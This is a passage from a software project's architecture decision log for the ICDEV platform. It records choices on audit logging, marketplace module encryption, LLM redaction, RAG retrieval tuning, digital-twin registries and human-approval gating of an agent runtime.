- **D-GEN-6:** All autonomous decisions logged to append-only genesis_audit table (NIST AU)
- **D-GEN-7:** Code patches require human cherry-pick to main — highest safety for code changes
- **D-GEN-8:** Weekly Report includes Evolve change log with diffs — human oversight without daily burden
- **D-GEN-9:** Feature flag ICDEV_GENESIS_ENABLED (default: false) — opt-in activation
- **D-GEN-10:** Append-only genesis_audit table for all autonomous decisions (NIST AU compliance)
- **D-GEN-11:** Feedback loop is pull-based (v2.0 pulls from v1.x) — v1.x doesn't need to know v2.0 exists
- **D-GEN-12:** Weekly report includes all promotions, rejections, metrics — human oversight without daily burden

### D-SBD — Secure by Design (Cloudyrion)

- **D-SBD-1:** Cloudyrion 8-Pillar SbD Framework mapped to all 35 SBD requirements via `sbd_pillars` field
- **D-SBD-2:** Security exception registry in `sbd_exceptions` table (active/expired/renewed lifecycle, max 365 days)
- **D-SBD-3:** Exception aging gate: expired exceptions block deployment (Cloudyrion anti-pattern: lingering exceptions)
- **D-SBD-4:** CISA SbD added to crosswalk engine as `cisa_sbd` framework key (implement once, satisfy many)
- **D-SBD-5:** Golden Path child apps auto-inherit SECURITY.md, .well-known/security.txt, and args/sbd_gates.yaml
- **D-SBD-6:** Developer Scorecard expanded to 6 dimensions (sbd_posture=0.20 weight, penalizes expired exceptions)
- **D-SBD-7:** SbD goal workflow: 7-step assess-review-remediate-report cycle with Cloudyrion pillar alignment

### D-INV — Innovation Features

- **D-INV-1:** cATO OSCAL streaming uses incremental assessment-results (per-control, not bulk)
- **D-INV-2:** Evidence freshness thresholds: current <= 30d, stale <= 90d, expired > 90d
- **D-INV-5:** Template provenance via SHA-256 content hash (tamper detection)
- **D-INV-9:** DORA metrics computed from audit_trail stage timestamps (no external CI integration needed)
- **D-INV-10:** Bottleneck detection via p90 statistical analysis (no ML)
- **D-INV-13:** Two-tier LLM for narrative generation: qwen3 drafts, Claude reviews
- **D-INV-14:** Narrative approval workflow: draft -> pending_review -> approved/rejected
- **D-INV-17:** Heatmap matrix uses N x M artifact-type cross-reference (not individual artifacts)
- **D-INV-21:** PR diff analysis via subprocess git (no GitHub API dependency)
- **D-INV-25:** STRIDE threat analysis is deterministic rule-based per component type (no LLM)
- **D-INV-26:** STRIDE-to-NIST mapping: Spoofing->AC/IA, Tampering->SC/SI, Repudiation->AU, InfoDisc->SC, DoS->SC/CP, EoP->AC
- **D-INV-29:** Scorecard weighted composite (6 dimensions): code_quality=0.20, security=0.20, compliance=0.15, test_coverage=0.15, velocity=0.10, sbd_posture=0.20
- **D-INV-33:** Golden Path uses declarative YAML template definitions (5 built-in templates)
- **D-INV-37:** Forge Hub trust score: validation=0.30, rating=0.25, downloads=0.20, age=0.15, author=0.10
- **D-INV-41:** ATO simulator uses PERT sampling via stdlib random.betavariate (zero deps)
- **D-INV-45:** Firmware SBOM output format: CycloneDX 1.5 JSON
- **D-INV-46:** VEX output format: CSAF 2.0 with per-component exploitability status
- **D-INV-48:** All innovation features use icdev.db (NOT sparkpilot.db -- that's for IoT/embedded only)

### D-HARNESS — Harness Engineering

- **D-HARNESS-1:** Loop state in `.tmp/sessions/` JSON (ephemeral, not DB)
- **D-HARNESS-2:** Loop detection is soft-signal only (stderr, exit 0) -- never blocks
- **D-HARNESS-3:** Progress file is JSON (models handle structured data better)
- **D-HARNESS-4:** Exit criteria in args/ YAML (FORGE separation)
- **D-HARNESS-5:** Trace analyzer scanner-tier only (zero Claude tokens)
- **D-HARNESS-6:** Maturity assessor read-only, advisory-only
- **D-HARNESS-7:** Scaffolder generates 3 hooks (minimal), not all 7
- **D-HARNESS-8:** One new append-only DB table: `harness_trace_recommendations`

### D-WG — WriteGuard

- **D-WG-1:** Independent `tools/writing/` directory for marketplace portability
- **D-WG-2:** Deterministic-first pipeline (regex before LLM) -- air-gap safe, reproducible
- **D-WG-3:** 5-layer style guide cascade with ISSO locks (Platform->Tenant->Program->Project->User)
- **D-WG-5:** Plagiarism via RAG similarity (0.85 threshold)
- **D-WG-6:** AI detection is deterministic (advisory-only) -- perplexity, burstiness, n-gram stats
- **D-WG-7:** Snippets follow knowledge_base.py CRUD + hybrid search pattern
- **D-WG-8:** GovProposal via read-only bridge -- never writes to proposal tables
- **D-WG-9:** Append-only analysis results (NIST AU compliant)
- **D-WG-12:** Two-tier routing per function -- grammar/readability deterministic, tone scanner, rewrite/coherence worker

### D-MKT-S — Marketplace SaaS

- **D-MKT-S1:** Marketplace extracted to standalone SaaS (marketplace.icdev.ai) -- ICDEV™ uses thin client (4 files, ~400 LOC)
- **D-MKT-S2:** Two modes: oss (all unlocked, default), saas (token verification)
- **D-MKT-S3:** Token verification is 100% offline via RSA-SHA256 public key -- 30-day grace period for air-gap
- **D-MKT-S4:** Thin client: module_runtime.py (gating), license_client.py (sync/verify/renew/feedback), token_store.py (local JSON cache)

### D-MKT-C — Marketplace Community

- **D-MKT-C1:** Community-first model: 90-day free activation, unlimited renewals, no SLA
- **D-MKT-C2:** Sponsor tiers (platinum/gold/silver/bronze) are recognition badges only -- no feature gating, donations handled externally
- **D-MKT-C3:** Renewal = feedback touchpoint: optional survey on each renewal for continuous improvement

### D-MKT-E — Marketplace Encryption

- **D-MKT-E1:** At-rest encryption for marketplace modules using AES-256-GCM with HKDF-SHA256 key derivation
- **D-MKT-E2:** Encryption key derived from token `encryption_seed` field (hex string, stable across renewals) + module slug as HKDF salt
- **D-MKT-E3:** File format: `[4B "IENC"][2B version][12B nonce][NB ciphertext+GCM tag]` -- GCM provides both confidentiality and integrity (no separate HMAC)
- **D-MKT-E4:** Custom `sys.meta_path` import hook (`EncryptedModuleFinder`) transparently decrypts `.py.enc` files to memory on import -- never writes plaintext to disk
- **D-MKT-E5:** Anti-tamper: if `.py` exists where `.py.enc` is expected for a protected module, import is refused with `ImportError`
- **D-MKT-E6:** Per-module encryption keys (different slug = different HKDF salt = different key) -- per-child-app isolation via per-license `encryption_seed`
- **D-MKT-E7:** OSS mode skips encryption entirely (files in the clear); SaaS mode encrypts on install, decrypts on import
- **D-MKT-E8:** Key and code object caches are per-process lifetime -- each module decrypted only once per process, ~0.5ms per 100KB

### D-MKT-D — Marketplace Defaults

- **D-MKT-D1:** Marketplace disabled by default (air-gapped/OSS). Enable with `ICDEV_MARKETPLACE_ENABLED=true` env var or `args/marketplace_config.yaml enabled: true`. When disabled: `is_module_enabled()` returns True (all features are core), marketplace commerce routes return 501, no token checks, no network calls, no encrypted import hooks.

### D-CF — Connector Forge & CloudForge

- **D-CF-1:** Connector Forge `forge/` is a subpackage of `tools/databridge/` -- imports from existing ABCs
- **D-CF-2:** Two-tier LLM for code gen (qwen3 drafts connector skeleton, Claude reviews against ABC contract)
- **D-CF-3:** Inline Jinja2 template strings with string-replacement fallback (air-gap safe)
- **D-CF-4:** Docker sandbox primary (--network none, --memory 256m), subprocess fallback
- **D-CF-5:** Two new ConnectorType enum values: SOAP, HEALTH
- **D-CF-6:** Promotion state machine: sandboxed → promoted → published → deprecated
- **D-CF-7:** 8 new audit event types for forge lifecycle
- **D-CF-8:** Marketplace install via ASSET_TYPE_DIRS["databridge_connector"]
- **D-CF-9:** MCP server exposes 8 tools for forge operations
- **D-CF-10:** Config in databridge_config.yaml under forge: block
- **D-CF-19:** Runbooks stored as JSON DAG (tasks_json + edges_json) in SQLite -- air-gap safe
- **D-CF-20:** Runbook executions are append-only with per-task log (NIST AU compliance)
- **D-CF-21:** DAG execution uses Kahn's algorithm (topological sort) -- deterministic O(V+E), no LLM in critical path
- **D-CF-22:** Snippets are self-contained sub-DAGs embedded by reference with usage count tracking
- **D-CF-23:** Metastore uses adjacency list for dependency graph (matches D27 pattern, SQL joins)
- **D-CF-24:** Auto-discovery pulls from db_connections, cf_landing_zones, devices -- idempotent upsert
- **D-CF-25:** Conditional branching uses deterministic expression eval (key-operator-value triples, no eval())
- **D-CF-26:** AI runbook generation is non-critical-path, always outputs status='draft'
- **D-CF-27:** RTO/RPO stored as hours (REAL) on cf_applications -- simple numeric comparison
- **D-CF-28:** Single unified Ops MCP server with 18 tools (reduces MCP server proliferation)
- **D-CF-29:** YAML runbook templates in args/cloudforge_runbook_templates/ (FORGE args layer)
- **D-CF-30:** Community: 3 runbooks, no snippets/AI/discovery; Pro: unlimited

### D-SC — Scale Engine

- **D-SC-1:** Scale Engine uses ThreadPoolExecutor wrapping existing sync connectors (no ABC changes)
- **D-SC-2:** Per-connector-type connection pools (key = connector_name)
- **D-SC-3:** WAL + batch flush for sync log and audit writes (single writer thread)
- **D-SC-4:** Fixed limits (configurable max_workers, max_concurrent_syncs via YAML)
- **D-SC-5:** Semaphore enforces max_concurrent_syncs (makes existing config value real)
- **D-SC-6:** stdlib only (concurrent.futures, threading, queue); psutil optional for backpressure
- **D-SC-7:** Append-only audit trail preserved (INSERT only in WriteBatcher, NIST AU)

### D-RDT — Redaction & Data Protection (Phase 70)

- **D-RDT-1:** Proposal functions (proposal_drafting, requirement_extraction, bid_scoring, color_review) route to local Ollama only — cloud LLMs never see raw proposal content
- **D-RDT-2:** WriteGuard rewrite (wg_rewrite) stays on Claude — rewrites style/grammar, not sensitive content
- **D-RDT-3:** Chat-time anonymization (adapted from AI Automators ep3 design), not ingestion-time — documents stored raw, anonymized at LLM boundary
- **D-RDT-4:** Two-pass detection: surrogate entities (PERSON, LOCATION) at 0.7 threshold with Faker replacements; hard-redact entities (SSN, credit card) at 0.3 threshold with [REDACTED] placeholders
- **D-RDT-5:** Conversation-scoped surrogate registries with 72-hour TTL, persisted to SQLite
- **D-RDT-6:** Past performance generalization via deterministic rules (dates→quarters, amounts→ranges, counts→rounded) — no LLM needed
- **D-RDT-7:** GovCon deny-lists and custom terms in YAML config (FORGE args/ pattern)
- **D-RDT-8:** Ollama gemma3 for NER (replaces spaCy — Python 3.14 compatible, air-gap safe, zero new dependencies)
- **D-RDT-9:** Central pre-invoke hook in router.invoke() protects ALL 50+ LLM callers — no per-module integration
- **D-RDT-10:** Scope mode: all (default) — every LLM call redacted unless exempt; enforced modules never skip even for local routing
- **D-RDT-11:** Performance: singleton sanitizer (30min TTL), module-level Ollama cache (60s TTL), pre-compiled regex, cached YAML configs
- **D-RDT-12:** Child apps inherit redaction automatically (tools/redaction/ not in PARENT_ONLY_DIRS)

### Phase 75 — CRX Component Review Remediation (D-CRX)

Distilled from 20 Hermes component reviews (2026-07-19, 160 recommendations). Full
160-finding disposition matrix: [phase-crx-xcut-01-disposition-matrix.md](../features/phase-crx-xcut-01-disposition-matrix.md).

- **D-CRX-1:** Every one of the 160 review findings gets a recorded disposition (BUILT / COVERED / SUPERSEDED / DEFERRED / REJECTED) — dropped items are documented, not lost. Disposition of a "missing" finding is verified against the live tree before recording, because the reviews repeatedly flagged existing capabilities as absent.
- **D-CRX-2:** Triage outcome: 26 BUILT this cycle, 84 COVERED (pre-existing, spot-verified), 8 SUPERSEDED (RCE/DMX cards), 30 DEFERRED, 12 REJECTED. ~74% were already handled or superseded — the 17 build tasks addressed only genuine gaps.
- **D-CRX-3:** Genesis reflex hardening is real (not stale): shared `get_connection` across reflexes matched prior PG lock-storm incidents. Fixed via per-reflex connection scope (crx-gen-01 #657), failure-health alerting + genesis_audit indexes (crx-gen-02 #668, migration 284), and `depends_on` topo-order + resource caps (crx-gen-03 #673).
- **D-CRX-4:** DB observability/retention built on the existing storage layer: query/pool health metrics (crx-db-02 #681), config-driven retention/archival (crx-db-03 #700, `retention_sweep` reflex). PostgreSQL-native RLS shipped as a go/no-go **spike only** (crx-db-01 #693), sanitized for the public repo (#702) — the app-level predicate remains the authoritative boundary.
- **D-CRX-5:** Kanban SLA/deadline fields (`due_date`, `sla_hours`, migration 285) + cycle-time/velocity metrics (crx-kan-01 #677). Notification routing/escalation/per-user-prefs extend the existing `notification_service` (crx-not-01 #684); PagerDuty/Opsgenie on-call integration REJECTED (external-SaaS, no demand).
- **D-CRX-6:** Testing gaps closed where absent: Locust perf harness (crx-test-01 #691), Section 508 a11y sweep (crx-test-02 #682), pytest-xdist parallelization spike → conditional GO (crx-test-03 #696). Chaos/visual-regression/coverage-trending DEFERRED.
- **D-CRX-7:** Security additions compose existing primitives: UBA insider-risk-lite (crx-sec-01 #686) and SOAR-lite HITL playbooks over `runbook_execute`/`incident_create` (crx-sec-02 #697). Purple-team (ATT&CK), CSPM, and supply-chain vendor risk were already COVERED (`atlas_red_team.py`, `csp_monitor.py`, `scrm_assessor.py`).
- **D-CRX-8:** GovCon additions: past-performance auto-suggest (crx-gov-01 #698) and FAR/DFARS clause-risk engine (crx-gov-02 #687). KG blast-radius freshness dimension folded into DIC `freshness_engine` (crx-kg-01 #683). Post-migration validation + rollback in wave plans (crx-mig-01 #694).
- **D-CRX-9:** REJECTED on standing principles: React/Vue SPA + Vite + npm component libraries (no-npm; server-rendered Flask for compliance-constrained surfaces); Redis distributed LLM cache (air-gap, process-local LRU by design); ESG and SAP/Oracle/Coupa procurement sync (no demand).
- **D-CRX-10:** SUPERSEDED-by-card findings are owned elsewhere, not re-solved here: RAG scale/RAPTOR/contextual/query-rewrite → RCE card; DocMod/DIC pack-interference and semantic-claim tracking → DMX card. NDC/security/data-canvas reviews were largely closed by the completed NDC/SHX/DCPR/PENTA/NAV hardening sweeps.
- **D-CRX-11:** `crx-gate-00` stays HELD (pipeline-exempt): CRX tasks are card-lead-dispatched, never promoted by the backlog runner.

### Phase 72 — ICDEV™ Studio (Low-Code/No-Code Platform)
- **D361:** Build own visual workflow engine — no n8n embedding (fair-code license incompatible with gov redistribution)
- **D362:** Canvas rendering via vanilla JS + SVG — no React/npm deps, air-gap safe, consistent with existing dashboard
- **D363:** Forms serialize to JSON Schema (draft-07) — industry standard, portable, auto-generates DB + API + UI
- **D364:** Case state machines use finite-state-machine pattern — deterministic, auditable, NIST AU compliant
- **D365:** Citizen automations are event-sourced — full replay for debugging and compliance audit
- **D366:** NL App Builder uses two-tier LLM (Ollama draft + Claude refine) — consistent with existing router architecture

### Phase 73 — DocMod Extension (DMX)
- **D367:** Extend, don't redesign — every DMX capability (temporal validity, cross-reference cascade, link-rot, freshness notifications, NIST/CVE feeds, regen gate) reuses the existing docmod scanner, the append-only `docmod_findings` supersede chain, the `drift_bridge` → ACOIC compliance sink, and the shared `tools.quality` grounding modules. No parallel finding store, no new compliance path, no new LLM verdict surface — preserves the 5 DOCMOD invariants (deterministic TRUST verdicts, append-only findings, HITL `pending_review` gating, air-gap safety, RLS tenant_id/classification).
- **D368:** New domain packs (`sop_workflows`, `architecture_patterns`) are pure-YAML rulebooks on the shared `RulebookPack` — a new rules-driven domain needs NO Python. Both ship `enabled: false` pending real-corpus validation; org/role-specific rules ship commented (no org catalog in-repo).
- **D369:** Temporal validity is PROACTIVE and complements the REACTIVE supersession packs — OPTIONAL ISO-8601 date fields on a rule flag a citation as its sunset approaches/passes independent of any supersession map. Phase encoded in `finding_type` (`expiring_reference`/`stale_reference`) so the scanner dedupe key stays phase-aware; a rule without dates behaves exactly as before.
- **D370:** External-source refresh is **scheduled pull, not webhook/push** — the NIST CSRC publications feed (`nist_pubs_sync`) and the CVE bridge poll on a cadence rather than receiving pushed events. Rationale: the dashboard is not internet-reachable (inbound webhooks cannot be delivered in the target air-gapped/isolated topologies); a stdlib-only (`urllib` + `defusedxml`) https-only, TLS-verified, tight-timeout, cadence-gated outbound pull that swallows egress failure fits the air-gap posture and adds no new dependency and no new poller (CVE bridge reuses the existing supply-chain `cve_triage` store).
- **D371:** Cited-URL link-rot checking treats document URLs as an SSRF surface — the egress guard resolves each hostname to its IP(s) and checks EVERY resolved address (post-resolution, defeating DNS-rebinding) against loopback/RFC1918/link-local (incl. cloud instance-metadata)/multicast/reserved before any socket opens; https-only, denylist-wins allow/deny, no auto-followed redirects, per-sweep cap. Air-gap-unreachable is never scored as "rotted". (Sandbox-coverage Gap 32.)
- **D372:** Regeneration gets its OWN deterministic pre-`pending_review` gate (`regen_quality_gate`) — citation re-validation + placeholder/consistency checks block a defective regeneration from the review queue unless a human forces the override; pure regex/difflib, no LLM gates promotion, read-only over the version tables.
- **D373:** Semantic claim tracking — **GO, conditional / single-domain / human-approval-gated** (`docs/design/dmx-claims-tracking-spike.md`). The LLM proposes claim *structure*; claim *validity* comes only from a deterministic `docmod_findings` verdict; extracted claims land `pending_review` for HITL promotion. Implementation (`dmx-claims-02`) is **PARKED** behind `dmx-gate-00` until a human signs off the spike — no code, migration, tables, or claims-panel UI ship under DMX.
- **D374:** Living-document mode — **adopt-later**, reuse the DIC Tech Writer workspace + existing `dic_suggestions` queue + existing approve gate plus ONE thin *batch-approve → single new version* action (`docs/design/dmx-living-document-spike.md`). Rejected a parallel "baseline/redlines/batch-approval" data model (YAGNI — the baseline is the latest approved `dic_versions`, the redlines are pending `dic_suggestions`, the audit is append-only `dic_suggestion_decisions`).

### Phase 74 — RCE (RAG Context Engineering)
Evolve the existing RAG pipeline (better chunk context, a summary hierarchy, cheaper vectors) rather than swap vector backends. Every change is measured against a committed baseline (rce-eval-01), is opt-in/default-OFF, and is pure-Python + air-gap safe. Source analysis: `C:\AI\searches\archive\rag_alt.md`. See `docs/features/phase-rce-rag-context-engineering.md`.
- **D-RCE-1:** Baseline-first — no RCE change lands unmeasured. `tools/rag/rag_benchmark.py` scores a compliance/NIST golden query set (`args/rag/golden_query_set.yaml`) for recall@k, MRR, citation-hit-rate, ndcg, reusing `evaluator.mrr`/`ndcg_at_k` (no re-implemented scoring); the committed `data/rag/rce_baseline.json` is the reference for `--compare` deltas. Ground-truth is expressed as content substrings (not only chunk IDs) so it survives the re-indexing that contextual retrieval and RAPTOR perform.
- **D-RCE-2:** Contextual retrieval (Anthropic pattern) — embed a ~50-100 token LLM context prefix + chunk, but **store and cite the original chunk** (`VectorChunk.text_for_embedding()`; `content_hash` computed on original for stable dedup). Preserves citation integrity while improving embedding recall. Default OFF; graceful no-op air-gapped; deterministic source_type/metadata heuristic fallback.
- **D-RCE-3:** SQLite vectors default to **float16** with a self-describing `RVQ1` header (magic + dtype byte + payload). Reads decode float16, headered float32, and legacy headerless float32 — so the ~48% storage win needs no re-index. Fixes the latent `migrate_tier` warm-path bug where headerless float16 was mis-read as float32. Binary quantization + Hamming pre-filter (`sign_bits` column) is available but default OFF pending per-corpus recall validation.
- **D-RCE-4:** RAPTOR summary hierarchy — `rag_chunk_summaries` (level 0 leaves → level 1 sibling summaries → level 2 root), co-located with `rag_chunks` in the vector-store DB (not `icdev.db`, so no conftest churn), carrying `tenant_id` + `classification` (RLS parity, **not** append-only). Retrieval merges summary tiers with leaves and dedups by lineage (leaf/finer granularity wins; orphan summaries kept as weak-retrieval fallback). Summaries are tagged `is_summary` and never surfaced as citation sources — citations resolve to leaf chunks. Default OFF.
- **D-RCE-5:** **TurboQuant — SKIP.** A standalone FAISS-compatible quantization library with no pgvector integration; pgvector's HNSW already gives O(log n) ANN, and the SQLite fallback does pure-numpy/Python cosine that TurboQuant does not plug into. Its KV-cache-compression benefit is an inference-provider concern, not a retrieval-layer one. (Recorded so it is not re-litigated.)
- **D-RCE-6:** **Turbopuffer — SKIP.** Cloud-only; `pip install turbopuffer` is only an API client with no embedded/`:memory:` mode, so it cannot satisfy the SQLite air-gap/offline fallback that `storage.py`'s dual-backend design depends on.
- **D-RCE-7:** **Qdrant — DEFER (not adopt).** Qdrant local mode exists and has built-in quantization, but it adds a Rust wheel dependency and breaks the "pure Python + SQL" fallback philosophy; the factory already auto-detects pgvector → ChromaDB → FAISS → SQLite. Revisit only if the SQLite fallback becomes a *measured* bottleneck (the float16/binary-quant work in D-RCE-3 targets that risk first).
- **D-RCE-8:** **Domain-adapted embedding fine-tune — NO-GO / DEFER** (rce-eval-02; `docs/features/rce-eval-02-domain-embedding-feasibility.md`). The corpus holds ~0 in-domain (compliance/NIST) chunks of 1397, so there is nothing to fine-tune on; the low baseline is a corpus-coverage gap, not an embedding-quality gap. Embeddings run through the `get_embedding_provider()` abstraction (configured in `args/llm_config.yaml` `embeddings:`), so any future candidate is a new provider behind the ABC, not an Ollama/nomic code fork. Re-evaluate (via `tools/rag/embedding_feasibility.py`) after compliance-corpus ingestion; prefer contextual retrieval + RAPTOR + reranking first.

### Phase 75 — TWX (Twin Core Unification)
Turn 8 isolated canvas digital twins into a system twin — one registry, one canonical schema, one observer, one event fabric — additively, without rewriting any working twin. Source analysis: `C:\AI\searches\icdev-digital-twin-analysis.md` + `icdev-digital-twin-sequoia-shift-research.md`. See `docs/features/phase-twx-twin-core.md`.
- **D375:** **Additive registry over rewrite.** `tools/twin_core/` adds a thin per-canvas adapter + one canonical verdict/violation schema (Sequoia Pattern 4) OVER the existing twins — it never reimplements a twin's logic. The registry is data-driven (adapters self-register; `discover()` imports `adapters/` by filesystem scan; display names cross-checked against `component_registry.yaml`) — no hardcoded canvas list. Rationale: the 8 twins each carry hard-won honesty invariants (BDC heuristic labeling, PDC dedup/retention, ODC estimate basis, DDC lineage grounding, IDC STIG-CAT); a rewrite would risk them. The schema **wraps, never obscures** each twin's `method` provenance and never fabricates a verdict (`unknown` stays `unknown`).
- **D376:** **Correction — the IDC IaC Twin was ALREADY shipped (Phase IDC-1).** The source docs claimed IDC had "no twin". FALSE: `tools/infra_canvas/` ships `snapshot_writer.py` (→ `idc_twin_snapshots`/`idc_twin_violations`), `preapply_gate.py`, importers (tf_state/pulumi/aws), emitters, IQE adapter, and the `idc_cloud_drift` reflex. The docs' aspirational `tools/infra_canvas/twin/` package (with `cross_csp.py`/`compliance_gate.py`) does **not** exist on disk; the real twin is flat files. The IDC adapter wraps the flat-file twin as-is.
- **D377:** **Correction — refresh-reflex coverage was far broader than the docs' "cATO-only" claim.** Dedicated refresh reflexes already existed for NDC (`ndc_topology_drift`), PDC (`pdc_pipeline_stale`), SDC (`sdc_control_expiry`), BDC (`bdc_isa_expiry`+`cato_twin`), DDC (`freshness_guardian`), ODC (`odc_coverage_refresh`), IDC (`idc_cloud_drift`). Only Mission (+ the new AIML) lacked one. The gap is filled by a SINGLE generic `twin_freshness_sweep` reflex (observer-driven, publishes `twin.snapshot.stale`) rather than one near-duplicate reflex per canvas — future twins are covered automatically.
- **D378:** **New snapshot tables follow the PDC retention pattern, NOT append-only.** `qdc_twin_snapshots`, `aadc_twin_snapshots`, `aiml_twin_snapshots` use sha256 dedup + bounded auto-snapshot retention (like `pdc_snapshots`) and are deliberately ABSENT from `APPEND_ONLY_TABLES` (they are prunable log-rotation surfaces). Created via each canvas's own `db/init_db.py` (the registry-declared migration path — PG-canvas-DB correct, avoids the migration-number hotspot) + conftest entries. Canvas connection helpers (`get_canvas_connection()`-backed) are used because canvas tables lack `tenant_id`/`classification` RLS columns. No new append-only audit tables were introduced by TWX.
- **D379:** **Small event taxonomy.** Twins publish exactly two lifecycle events (`twin_snapshot_taken`, `twin_simulation_completed`) via the registry facade, plus two wired cross-canvas subscriptions (PDC `pipeline_deployed`→SDC refresh; SDC `sdc_threat_model_changed`→BDC crosswalk drift). Kept intentionally minimal (extend later). All publishing honors the cross-canvas bus's existing classification-aware security-context propagation. Optional twin-drift kanban cards reuse the suggested-card quarantine flow (`status='suggested'`), gated OFF by default (`ICDEV_TWIN_DRIFT_CARDS`) — never auto-create unquarantined tasks.
- **D380:** **Wave-2 twin coverage — build the justified, park the rest.** Built QDC + AADC (cov-01) and AIML (cov-02, `aiml_designs.graph_json` + reuses `aiml_assessments`). PARKED with rationale: **MDC** (wave-2b — larger surface, already has `simulate_commit_check`); **OHC/DSOC/CCC/PMC/NOCC** (operational state, already served by domain monitor reflexes, no design-graph what-if surface); BI/AISG/Cortex/DIC/etc. (no snapshot+delta semantics). Audit: `docs/features/twx-cov-02-twin-coverage-audit.md`.
- **D381:** **Federation is EXTEND, not duplicate.** Air-gap validation (fed-01) is a config-driven shared rule module (`args/twin_airgap_rules.yaml`) emitting `deployment_blocker` violations, wired into NDC/PDC/IDC adapters; deny-by-match (guards the "query-as-compliance false-confidence" risk). Target presets (fed-02) reuse the existing `context/cloud/csp_service_registry.json` (not a new catalog) + the fed-01 air-gap rules; PUBLIC-DATA-ONLY (customer catalogs via `ICDEV_CSP_CATALOG_PATH`) with a 180-day staleness guard. Corrected the docs' claim that `cross_csp.py`/`validate_region` cross-CSP simulation exists — `cross_csp.py` is absent; `validate_region` lives in `tools/cloud/region_validator.py`.
- **D382:** **Spike outcomes.** **LocalStack (spk-01): mostly SKIP** — 2026 single authenticated image (no free community edition) makes it a NO-GO for air-gapped/classified + a paid subscription; Docker footprint conflicts with the pure-Python/offline preference; only the PDC/IaC CI gate is a conditional GO (cloud-CI only); the existing `localstack_connector.py` is already flag-gated (keep as-is); never use LocalStack timings for performance claims. **Batfish (spk-02): GO — opt-in augmentation** — the graph-vs-config mismatch is NOT fatal because `tools/network/config_generator.py` already renders Cisco IOS/Arista EOS/Juniper JunOS configs that Batfish can ingest; Batfish materially improves reachability/ACL/boundary intents; better air-gap story than LocalStack (Apache-2.0 OSS, self-hosted, no license); heuristics remain the default fast path. Both seed only human-gated follow-ups (`twx-ls-*`, `twx-bf-*`).
- **D383:** **fed-03 (compatibility report + ATO acceleration) — PARKED / scoped follow-up.** The compatibility-report generator (executive verdict + per-resource pass/warn/fail + required IAM/network changes + dependency replacements + ATO evidence checklist, OSCAL via the BDC path, rendered via `tools/viz/`) and the ATO-acceleration wiring (IaC-resource → NIST 800-53 control statements + POA&M via the EXISTING `ssp_generator`/`poam_generate`/`crosswalk`/`cato_twin`) are integration work composing many existing engines. Deferred to keep the TWX close-out clean; the fed-01 air-gap + fed-02 target-preset foundations it builds on are in place. It is an integration task (no new compliance logic) and should reuse the existing OSCAL/SSP/POA&M engines with `classification_manager.py` markings and per-claim IaC-resource citations (TRUST).

### Phase 76 — SAG (Standalone Agent Runtime completion)
Turn the standalone agent into a self-sufficient product: user-facing cron, directory-based profile isolation, HITL skill self-creation, and an Email gateway channel. The governing decision throughout was **compose existing primitives, don't rebuild** — the source analysis (`C:\AI\searches\icdev-standalone-agent-transformation-roadmap.md`, `icdev-standalone-agent-findings.md`) repeatedly claimed greenfield gaps that were actually already shipped, most traceable to reading a **stale `icdev/` mirror path** instead of the live `tools/` tree. See `docs/features/phase-sag-standalone-agent.md`.
- **D384:** **Compose, don't rebuild — the SAG surface is an orchestration shell over shipped engines.** `AgentRuntime.run_turn` wraps `run_agent_loop`; sessions ride `chat_manager` + `agent_loop_session`; cron rides the daemon/reflex spine; skill generation reuses NOVA (`generate_skill_spec` + `agent_improvement_artifacts`); the gateway + 8-gate security chain + agent-mode pre-existed. No new LLM execution path or storage abstraction was introduced. New tables (`agent_cron_jobs`, `sag_profiles`, `sag_skill_registry`) self-create via `_ensure_schema()` and — because SAG tests are DB-independent (faked persistence) — are intentionally kept out of the conftest `MINIMAL_ICDEV_SCHEMA` (append-only `agent_cron_runs` is the only one gated in `APPEND_ONLY_TABLES`).
- **D385:** **Correction — the Remote Command Gateway already existed; the "stub gateway" claim came from a stale `icdev/` mirror.** The source docs described the gateway as a stub to be built. FALSE: `tools/gateway/` ships `gateway_agent.py` (Flask, multi-channel), `security_chain.py` (8 gates), `event_envelope.py`, `response_filter.py`, `user_binder.py`, and seven webhook adapters. `tools/gateway/` is **not mirrored to `icdev/`**, so a reader who inspected `icdev/tools/gateway/` (absent) wrongly concluded it did not exist. sag-gw-01 (agent-mode) and sag-gw-02 (Email adapter) EXTEND this real gateway; the security chain is unchanged.
- **D386:** **Correction — MCP tool exposure and unified server pre-existed; SAG does not add MCP tools.** `tools/mcp/unified_server.py` already exposes 440+ tools over stdio, and the SAG mutating surface (`mutating_tools.py`: file-write/terminal) is **deliberately NOT MCP-registered** so it is never reachable by an external agent. External-agent MCP access is the curated-toolset path (`sag-mcp-01`, `--toolset`), not per-runtime tool registration. Cron/profile/skills-lifecycle are operator management surfaces (CLI + HITL), not agent-callable tools — so no new `tool_registry`/`gap_handlers` or `security_gates.yaml` entries were warranted.
- **D387:** **Correction — the scheduling engine already existed; user-cron is a thin durable layer, not a new loop.** `tools/daemon/base.py` + the Genesis reflex registry + the kanban scheduler already drive schedule-based work. sag-cron-01 adds only a **durable user job store** + two exec modes + retry/backoff + delivery, ticked by a 1-minute `agent_cron_reflex` — it does not add a second scheduler. Cron delivery degrades gracefully (log → email SMTP/on-file → gateway best-effort). The deferred mem-01 `consolidate_session_facts()` is schedulable **through** cron as a `script` job rather than hard-wired as a fixed reflex (user-owned cadence).
- **D388:** **Profile isolation via tenant namespacing, NOT per-profile databases.** sag-prof-01 isolates operator profiles by namespacing the tenant (`<tenant>::prof:<name>`) so the single PostgreSQL primary + existing RLS/tenant plumbing does the filtering — per-profile SQLite files were rejected because they would fork the storage abstraction. The default profile is a strict no-op (byte-identical existing behaviour). A durable `sag_profiles` registry + an additive `sag_user_profiles.profile` tag column (PG-only `ADD COLUMN IF NOT EXISTS`, SQLite via self-create DDL) satisfy the "profile column on the relevant tables" requirement without a risky PK repartition.
- **D389:** **LLM-generated skills are TRUST surfaces — HITL-gated, never auto-promoted.** sag-skl-01 wires NOVA's generator (correcting the docs' "skill self-creation absent" claim — it existed behind `ICDEV_HARNESS_COLEARN`). Proposals stay quarantined (`pending`) in NOVA's queue; `approve_proposal()` is the **only** writer to `.agents/skills`, and only on explicit human approval, stamping provenance frontmatter (`source-session`, `source-model`, `trust: unverified-llm-generated`). The post-session proposal hook is env-gated OFF by default; the curator archives-never-deletes and never promotes. Recorded in `docs/security/sandbox-coverage.md` Gap 33 (bypass-documented: no auto-exec, execution stays on the `invoke.py` allowlist).
